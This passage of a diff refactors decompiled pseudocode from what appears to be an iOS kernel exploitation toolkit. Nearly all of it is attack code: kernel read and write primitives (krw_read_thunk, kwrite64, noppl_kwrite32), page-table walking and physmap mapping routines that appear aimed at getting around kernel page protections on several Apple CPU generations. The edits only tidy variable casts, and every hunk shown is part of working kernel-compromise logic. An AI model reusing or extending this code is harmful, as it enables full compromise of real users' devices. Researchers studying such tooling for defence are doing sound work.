     v182 = 163856;
     goto LABEL_315;
   }
-  v193 = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A17);
+  v193 = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A17);
   v194 = 0xFFFFFC7000000000LL;
   if ( !v193 )
     v194 = 0xFFFFFFF000000000LL;
   v286 = v194;
-  if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A14) )
+  if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A14) )
   {
     v195 = alloc_physmap_scratch_page(a1, size);
     if ( v195 )
@@ -15105,7 +15111,7 @@ LABEL_315:
                 address[0] = (src_address[4] & 0xFFFFFE000000LL) | 0x20000000000445LL;
                 if ( (unsigned int)kwrite_with_retry(a1, v186 + 8, (__int64)address, 8) )
                 {
-                  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, outputStruct, 8, input) )
+                  if ( (unsigned int)krw_read_thunk(ctx, outputStruct, 8, input) )
                   {
                     v199 = (input[0] & 0xFFFF000000003FFFLL) | v285;
                     v200 = *(uint64_t *)(a1 + 392);
@@ -15148,10 +15154,10 @@ LABEL_320:
   v179[101] = v201;
   v179[162] = ((v290 >> 11) & 0x3FF8) + v300;
   v179[163] = v290;
-  if ( !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13) )
+  if ( !krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13) )
   {
 LABEL_382:
-    v232 = krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A13);
+    v232 = krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A13);
     v233 = *(uint64_t *)(a1 + 7512);
     v234 = *(uint64_t **)(v233 + 600);
     v235 = *(uint64_t *)(v233 + 608);
@@ -15161,7 +15167,7 @@ LABEL_382:
         v236 = 832;
       else
         v236 = 848;
-      v1 = physmap_map_cached((struct_krwCtx *)a1, 0x23B080000uLL, (__int64)inputStruct);
+      v1 = physmap_map_cached(ctx, 0x23B080000uLL, (__int64)inputStruct);
       if ( (uint32_t)v1 )
         goto LABEL_431;
       v303 = *(uint64_t *)inputStruct;
@@ -15328,7 +15334,7 @@ LABEL_382:
         if ( !(unsigned int)get_kernel_version_build_0(a1, *(uint64_t *)(v233 + 344) + 1LL, v242 >> 8) )
         {
 LABEL_417:
-          if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, *(uint64_t *)(v233 + 792), 8, &v343) )
+          if ( !(unsigned int)krw_read_thunk(ctx, *(uint64_t *)(v233 + 792), 8, &v343) )
           {
 LABEL_428:
             v1 = 163855;
@@ -15356,7 +15362,7 @@ LABEL_430:
             v280 = 1;
 LABEL_425:
             semaphore_timedwait_ns(a1, 0x3E8u);
-            if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, *(uint64_t *)(v233 + 792), 8, &v343) )
+            if ( !(unsigned int)krw_read_thunk(ctx, *(uint64_t *)(v233 + 792), 8, &v343) )
               goto LABEL_428;
           }
         }
@@ -15455,7 +15461,7 @@ LABEL_425:
     *(__int128 *)(v265 + 264) = xmmword_431D0;
     *(uint64_t *)(v265 + 280) = 16;
     v266 = v265 + v251;
-    if ( krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_CPU_A14) )
+    if ( krw_ctx_has_flag(ctx, KRW_CTX_FLAG_CPU_A14) )
     {
       *(uint64_t *)v266 = *(uint64_t *)(v233 + 816);
       *(uint64_t *)(v266 + 8) = *(uint64_t *)(v233 + 824);
@@ -15490,7 +15496,7 @@ LABEL_425:
     while ( 1 )
     {
 LABEL_407:
-      if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, *(uint64_t *)(v233 + 792), 8, src_address) )
+      if ( !(unsigned int)krw_read_thunk(ctx, *(uint64_t *)(v233 + 792), 8, src_address) )
       {
         v1 = 163855;
         goto LABEL_431;
@@ -15526,15 +15532,15 @@ LABEL_431:
   v203 = *(uint64_t *)(v202 + 600);
   v204 = *(uint64_t *)(v202 + 608);
   LODWORD(size[0]) = 0x4000;
-  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, *(uint64_t *)(v202 + 592), 8, &outputStruct)
+  if ( !(unsigned int)krw_read_thunk(ctx, *(uint64_t *)(v202 + 592), 8, &outputStruct)
     || (v205 = *(uint64_t **)(a1 + 7512),
         v206 = v205[74],
         v207 = v205[96],
         LODWORD(input[0]) = 0x4000,
-        !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v206, 8, v316))
-    || (v208 = read_cryptex_manifest((struct_krwCtx *)a1, *(uint64_t *)v316 & 0xFFFFFFFFC000LL)) == 0
-    || !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v208, 8, address)
-    || (v209 = read_cryptex_manifest((struct_krwCtx *)a1, address[0] & 0xFFFFFFFFC000LL)) == 0 )
+        !(unsigned int)krw_read_thunk(ctx, v206, 8, v316))
+    || (v208 = read_cryptex_manifest(ctx, *(uint64_t *)v316 & 0xFFFFFFFFC000LL)) == 0
+    || !(unsigned int)krw_read_thunk(ctx, v208, 8, address)
+    || (v209 = read_cryptex_manifest(ctx, address[0] & 0xFFFFFFFFC000LL)) == 0 )
   {
 LABEL_370:
     v1 = v47;
@@ -15576,32 +15582,32 @@ LABEL_367:
   }
   for ( i = 0; i != 0x4000; i += 8 )
   {
-    if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v210 + i, 8, target_address) )
+    if ( !(unsigned int)krw_read_thunk(ctx, v210 + i, 8, target_address) )
       goto LABEL_368;
     if ( target_address[0] && !(unsigned int)kwrite_with_retry(a1, v296 + i, (__int64)target_address, 8) )
       goto LABEL_367;
   }
   v205[159] = v301;
   v205[160] = v296;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 536), v202 + 880);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 536), v202 + 880);
   if ( (uint32_t)v1 )
     goto LABEL_27;
   v1 = setup_physmap_rw_multi(a1, *(uint64_t *)(v202 + 544), *(uint64_t *)(v202 + 760));
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 560), v202 + 936);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 560), v202 + 936);
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 568), v202 + 992);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 568), v202 + 992);
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 576), v202 + 1048);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 576), v202 + 1048);
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 584), v202 + 1104);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 584), v202 + 1104);
   if ( (uint32_t)v1 )
     goto LABEL_27;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 528) & ~*(uint64_t *)(a1 + 392), v202 + 1160);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 528) & ~*(uint64_t *)(a1 + 392), v202 + 1160);
   if ( (uint32_t)v1 )
     goto LABEL_27;
   *(uint64_t *)((*(uint64_t *)(a1 + 392) & *(uint64_t *)(v202 + 528)) + *(uint64_t *)(v202 + 1160)) = 16424;
@@ -15722,7 +15728,7 @@ LABEL_378:
   memset(&src_address[2], 0, 184);
   src_address[25] = v227;
   *(__int128 *)&src_address[26] = v226;
-  v1 = setup_physmap_page_with_size((struct_krwCtx *)a1, *(uint64_t *)(v202 + 552), v202 + 1216);
+  v1 = setup_physmap_page_with_size(ctx, *(uint64_t *)(v202 + 552), v202 + 1216);
   if ( !(uint32_t)v1 )
   {
     memcpy(*(void **)(v202 + 1216), src_address, 0x118u);
@@ -15826,8 +15832,8 @@ unsigned __int64 __fastcall read_cryptex_manifest(struct_krwCtx *a1, unsigned __
 
   v2 = a2;
   v3 = a1;
-  v4 = *(uint64_t *)((char *)a1 + 6632);
-  v5 = *(uint64_t *)((char *)a1 + 6640);
+  v4 = KRWCTX_FIELD_U64(a1, 6632);
+  v5 = KRWCTX_FIELD_U64(a1, 6640);
   v6 = number_of_cpus();
   if ( krw_ctx_has_flag(v3, KRW_CTX_FLAG_CPU_A16_A17_MASK | KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) )
   {
@@ -15959,6 +15965,7 @@ LABEL_12:
 //----- (0000000000018DF0) ----------------------------------------------------
 __int64 __fastcall lookup_sptm_state_entry(__int64 a1, unsigned __int64 a2, uint64_t *a3)
 {
+  struct_krwCtx *ctx; // x20
   uint64_t *v4; // x9
   unsigned __int64 v5; // x8
   __int64 v6; // x8
@@ -15966,6 +15973,7 @@ __int64 __fastcall lookup_sptm_state_entry(__int64 a1, unsigned __int64 a2, uint
   __int64 v8; // x20
   __int64 v10; // [xsp+8h] [xbp-18h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v4 = *(uint64_t **)(a1 + 7512);
   v5 = v4[37];
   if ( v5 > a2 || v4[39] + v5 <= a2 )
@@ -15976,7 +15984,7 @@ __int64 __fastcall lookup_sptm_state_entry(__int64 a1, unsigned __int64 a2, uint
   if ( v7 <= a2 && v4[40] + v7 > a2 )
     v6 = a2 - v7 + v4[32];
   v8 = 163855;
-  if ( v6 && (unsigned int)krw_read_thunk((struct_krwCtx *)a1, v6, 8, &v10) )
+  if ( v6 && (unsigned int)krw_read_thunk(ctx, v6, 8, &v10) )
   {
     v8 = 0;
     *a3 = v10;
@@ -15987,14 +15995,16 @@ __int64 __fastcall lookup_sptm_state_entry(__int64 a1, unsigned __int64 a2, uint
 //----- (0000000000018EA4) ----------------------------------------------------
 unsigned __int64 __fastcall read_pgtable_entry(__int64 a1, unsigned __int64 a2, __int64 *a3, char a4)
 {
+  struct_krwCtx *ctx; // x23
   unsigned __int64 result; // x0
   __int64 v9; // x23
   __int64 v10; // [xsp+8h] [xbp-48h] BYREF
   __int64 v11; // [xsp+10h] [xbp-40h] BYREF
   __int64 v12; // [xsp+18h] [xbp-38h] BYREF
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   if ( !(unsigned int)krw_read_thunk(
-                        (struct_krwCtx *)a1,
+                        ctx,
                         *(uint64_t *)(*(uint64_t *)(a1 + 7512) + 592LL) + ((a2 >> 33) & 0x38),
                         8,
                         &v12)
@@ -16004,18 +16014,18 @@ unsigned __int64 __fastcall read_pgtable_entry(__int64 a1, unsigned __int64 a2, 
   }
   if ( (a4 & 1) != 0 )
   {
-    result = read_cryptex_manifest((struct_krwCtx *)a1, v12 & 0xFFFFFFFFC000LL);
+    result = read_cryptex_manifest(ctx, v12 & 0xFFFFFFFFC000LL);
     if ( !result )
       return result;
   }
   else
   {
-    result = resolve_physpage_addr((struct_krwCtx *)a1, v12 & 0xFFFFFFFFC000LL);
+    result = resolve_physpage_addr(ctx, v12 & 0xFFFFFFFFC000LL);
     if ( !result )
       return result;
   }
   v9 = result + ((a2 >> 22) & 0x3FF8);
-  if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v9, 8, &v11) || (v11 & 1) == 0 )
+  if ( !(unsigned int)krw_read_thunk(ctx, v9, 8, &v11) || (v11 & 1) == 0 )
     return 0;
   if ( (v11 & 2) == 0 )
   {
@@ -16027,13 +16037,13 @@ LABEL_13:
     return result;
   }
   if ( (a4 & 1) != 0 )
-    result = read_cryptex_manifest((struct_krwCtx *)a1, v11 & 0xFFFFFFFFC000LL);
+    result = read_cryptex_manifest(ctx, v11 & 0xFFFFFFFFC000LL);
   else
-    result = resolve_physpage_addr((struct_krwCtx *)a1, v11 & 0xFFFFFFFFC000LL);
+    result = resolve_physpage_addr(ctx, v11 & 0xFFFFFFFFC000LL);
   if ( result )
   {
     v9 = result + ((a2 >> 11) & 0x3FF8);
-    if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, v9, 8, &v10) && (v10 & 1) != 0 )
+    if ( (unsigned int)krw_read_thunk(ctx, v9, 8, &v10) && (v10 & 1) != 0 )
     {
       result = v10 & 0xFFFFFFFFC000LL;
       if ( !a3 )
@@ -16109,6 +16119,7 @@ LABEL_11:
 //----- (0000000000019128) ----------------------------------------------------
 __int64 __fastcall setup_physmap_rw_multi(__int64 a1, unsigned __int64 a2, __int64 a3)
 {
+  struct_krwCtx *ctx; // x23
   uint64_t *v3; // x25
   __int64 v4; // x8
   unsigned __int64 v5; // x27
@@ -16127,6 +16138,7 @@ __int64 __fastcall setup_physmap_rw_multi(__int64 a1, unsigned __int64 a2, __int
   uint64_t v23[4]; // [xsp+18h] [xbp-78h] BYREF
   __int64 v24; // [xsp+38h] [xbp-58h]
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v3 = *(uint64_t **)(a1 + 7512);
   v4 = v3[96];
   size[0] = 0x4000;
@@ -16137,7 +16149,7 @@ __int64 __fastcall setup_physmap_rw_multi(__int64 a1, unsigned __int64 a2, __int
   if ( v8 <= a2 && v8 + 0x2000000 > a2 )
     return 0xFFFFFFFFLL;
   v13 = 163855;
-  if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, v4 + ((a2 >> 33) & 0x38), 8, &v22) )
+  if ( (unsigned int)krw_read_thunk(ctx, v4 + ((a2 >> 33) & 0x38), 8, &v22) )
   {
     v14 = v6 && v7;
     if ( v5 >= 0x1FFC001 )
@@ -16150,7 +16162,7 @@ __int64 __fastcall setup_physmap_rw_multi(__int64 a1, unsigned __int64 a2, __int
       }
       else
       {
-        v15 = read_cryptex_manifest((struct_krwCtx *)a1, v22 & 0xFFFFFFFFC000LL);
+        v15 = read_cryptex_manifest(ctx, v22 & 0xFFFFFFFFC000LL);
         if ( !v15 )
           return v13;
       }
@@ -16162,7 +16174,7 @@ __int64 __fastcall setup_physmap_rw_multi(__int64 a1, unsigned __int64 a2, __int
         return v13;
     }
     v17 = v15 + ((a2 >> 22) & 0x3FF8);
-    if ( !(unsigned int)krw_read_thunk((struct_krwCtx *)a1, v17, 8, &size[1]) )
+    if ( !(unsigned int)krw_read_thunk(ctx, v17, 8, &size[1]) )
       return v13;
     if ( (size[1] & 1) == 0 )
     {
@@ -16198,7 +16210,7 @@ LABEL_29:
       }
       else
       {
-        v19 = read_cryptex_manifest((struct_krwCtx *)a1, size[1] & 0xFFFFFFFFC000LL);
+        v19 = read_cryptex_manifest(ctx, size[1] & 0xFFFFFFFFC000LL);
         if ( !v19 )
           return v13;
       }
@@ -16247,6 +16259,7 @@ __int64 __fastcall setup_macho_section_dispatch(__int64 result, __int64 a2, int 
 //----- (00000000000193C0) ----------------------------------------------------
 __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
 {
+  struct_krwCtx *ctx; // x24
   __int64 v6; // x24
   __int64 v7; // x0
   __int64 v8; // x23
@@ -16272,6 +16285,7 @@ __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
   __int128 v29; // [xsp+90h] [xbp-60h]
   __int64 v30; // [xsp+A0h] [xbp-50h]
 
+  ctx = KRWCTX_FROM_UINTPTR(a1);
   v23 = a2;
   v6 = *(uint64_t *)(a1 + 7512);
   v21 = 0x4000;
@@ -16284,26 +16298,26 @@ __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
   if ( (unsigned int)kwrite_with_retry(a1, v7, (__int64)v20, 2) )
   {
     if ( !kread_physmap_decorated(
-            (struct_krwCtx *)a1,
+            ctx,
             *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184),
             (unsigned __int64 *)&v22)
       || !(unsigned int)krw_read_thunk(
-                          (struct_krwCtx *)a1,
+                          ctx,
                           *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 180),
                           4,
                           &v19)
       || !(unsigned int)krw_read_thunk(
-                          (struct_krwCtx *)a1,
+                          ctx,
                           *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 196),
                           4,
                           &v18)
       || !(unsigned int)krw_read_thunk(
-                          (struct_krwCtx *)a1,
+                          ctx,
                           *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 192),
                           4,
                           &v17)
       || !kread_physmap_decorated(
-            (struct_krwCtx *)a1,
+            ctx,
             *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 188),
             (unsigned __int64 *)&v16) )
     {
@@ -16311,7 +16325,7 @@ __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
     }
     if ( !v16 )
       return 0xFFFFFFFFLL;
-    if ( (unsigned int)krw_read_thunk((struct_krwCtx *)a1, v16 + *(unsigned int *)(v6 + 172), 8, v15) )
+    if ( (unsigned int)krw_read_thunk(ctx, v16 + *(unsigned int *)(v6 + 172), 8, v15) )
     {
       if ( *(uint64_t *)(a1 + 344) <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
         v10 = 65539;
@@ -16330,7 +16344,7 @@ __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
       v25 = 0u;
       inputStruct = *(uint64_t *)(v6 + 28);
       v23 = a2 - v17;
-      if ( kwrite64((struct_krwCtx *)a1, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v8) )
+      if ( kwrite64(ctx, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v8) )
       {
         if ( noppl_kwrite32(a1, *(uint64_t *)(v6 + 240) + *(unsigned int *)(v6 + 180), 1) )
         {
@@ -16358,7 +16372,7 @@ __int64 __fastcall get_kernel_version_build_0(__int64 a1, __int64 a2, int a3)
         {
           v12 = 163856;
         }
-        if ( kwrite64((struct_krwCtx *)a1, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v22) )
+        if ( kwrite64(ctx, *(uint64_t *)(v6 + 232) + *(unsigned int *)(v6 + 184), v22) )
           return v12;
         else
           return 163856;
